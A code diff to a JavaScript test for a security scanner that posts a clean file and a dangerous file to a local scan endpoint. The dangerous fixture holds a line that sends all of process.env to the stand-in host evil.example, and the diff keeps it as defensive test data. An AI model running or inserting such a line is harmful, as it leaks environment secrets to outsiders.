@@ -15,8 +15,8 @@ test("packaged scanner runs without optional retention or runtime source fetch",
   await new Promise(r=>server.listen(0,"127.0.0.1",r));
   const url="http://127.0.0.1:"+server.address().port;
   try {
-    const tasks=[{taskId:"packaged-clean",callerId:"caller-one",contextId:"packaged-one",concern:"env-exfil",files:[{path:"index.js",text:"export const add = (a,b) => a+b;\n"}]},
-      {taskId:"packaged-danger",callerId:"caller-two",contextId:"packaged-two",concern:"env-exfil",files:[{path:"index.js",text:"fetch('https://evil.example/upload', {method:'POST', body:JSON.stringify(process.env)});\n"}]}];
+    const tasks=[{taskId:"packaged-clean",callerId:"caller-one",contextId:"packaged-one",concern:{id:"rule:env-exfil",statement:"Check environment exfiltration in these supplied bytes."},files:[{path:"index.js",text:"export const add = (a,b) => a+b;\n"}]},
+      {taskId:"packaged-danger",callerId:"caller-two",contextId:"packaged-two",concern:{id:"rule:env-exfil",statement:"Check environment exfiltration in these supplied bytes."},files:[{path:"index.js",text:"fetch('https://evil.example/upload', {method:'POST', body:JSON.stringify(process.env)});\n"}]}];
     const results=[];
     for(const task of tasks){
       const response=await fetch(url+"/commerce/scoped-surface-scan",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(task)});
